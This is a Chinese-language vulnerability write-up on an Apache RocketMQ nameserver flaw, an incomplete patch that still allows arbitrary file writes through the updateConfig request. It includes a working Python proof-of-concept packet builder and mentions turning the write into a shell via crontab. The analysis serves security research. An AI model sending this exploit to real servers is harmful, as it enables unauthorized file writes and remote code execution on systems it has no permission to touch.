# 漏洞描述

最近，阿里云又发布了RocketMQ的漏洞通告，因为才分析过这个漏洞，所以再来看一下

![](./img/3725217932679225891.png)

一看是由于上次没有修复完善的原因，拉一版修复的源码再来看一下。

# 漏洞分析

![](./img/5707163518535770012.png)

修补的地方在namesrv，还是updateconfig这个地方，这里可以用RocketMQ自己的协议，用不同的code调用过来

![](./img/948212335395296378.png)

![](./img/401878022786278409.png)

这里是318，namesrv的端口是9876

![](./img/9071857119759472894.png)

之前的漏洞，可以通过update造成任意文件写入，而补丁则把控制文件路径的properties加入来黑名单，跟进update

    
    
    public void update(Properties properties) {
        try {
            readWriteLock.writeLock().lockInterruptibly();
    
            try {
                // the property must be exist when update
                mergeIfExist(properties, this.allConfigs);
    
                for (Object configObject : configObjectList) {
                    // not allConfigs to update...
                    MixAll.properties2Object(properties, configObject);
                }
    
                this.dataVersion.nextVersion();
    
            } finally {
                readWriteLock.writeLock().unlock();
            }
        } catch (InterruptedException e) {
            log.error("update lock error, {}", properties);
            return;
        }
    
        persist();
    }

因为之前的了解，就直接跟到persist了

![](./img/6829305193863115377.png)

在string2File这里造成的任意文件写入，第二个参数是filename，所以跟进到getStorePath观察一番

![](./img/6484120033354480282.png)

最后的返回的realStorePath在这里赋值，storePathFiled是一个Field实例化的类，这个类是用于反射的，看到它时configStorePath字段，所以这里全是就是获取的其实是storePathObject中configStorePath的值

![](./img/1238101079897268255.png)

这些都是我们在RocketMQ的协议中的body可以控制的，并且没有被过滤，过滤的properties为configStorePathName

也印证了为什么这次的补丁时把configStorePathName改为configStorePath

# 漏洞复现

    
    
    import socket
    import binascii
    
    client = socket.socket()
    # you ip
    client.connect(('127.0.0.1',9876))
    # data
    json = '{"code":318,"extFields":{"test":"RockedtMQ"},"flag":0,"language":"JAVA","opaque":266,"serializeTypeCurrentRPC":"JSON","version":433}'.encode('utf-8')
    body='brokerConfigPath=/tmp/aaa/CaSO4.txt\nconfigStorePath=/tmp/aaa/DawnT0wn.txt\naaaConfigPath=123\\nMy name is DawnT0wn'.encode('utf-8')
    json_lens = int(len(binascii.hexlify(json).decode('utf-8'))/2)
    head1 = '00000000'+str(hex(json_lens))[2:]
    all_lens = int(4+len(binascii.hexlify(body).decode('utf-8'))/2+json_lens)
    head2 = '00000000'+str(hex(all_lens))[2:]
    data = head2[-8:]+head1[-8:]+binascii.hexlify(json).decode('utf-8')+binascii.hexlify(body).decode('utf-8')
    # send
    client.send(bytes.fromhex(data))
    data_recv = client.recv(1024)
    print(data_recv)

![](./img/2483920472642615502.png)

至于漏洞通告中写到的远程代码执行，在5.1.1版本之前可以结合FilterServerManager这个类的心跳机制，在unix和linux下可以命令执行，但是在5.1.0到5.1.1的版本更新中删除了这个类，只能用写crontab的方式来获取shell了

参考链接：

<https://github.com/apache/rocketmq/pull/6843/files>

<https://avd.aliyun.com/detail?id=AVD-2023-37582>

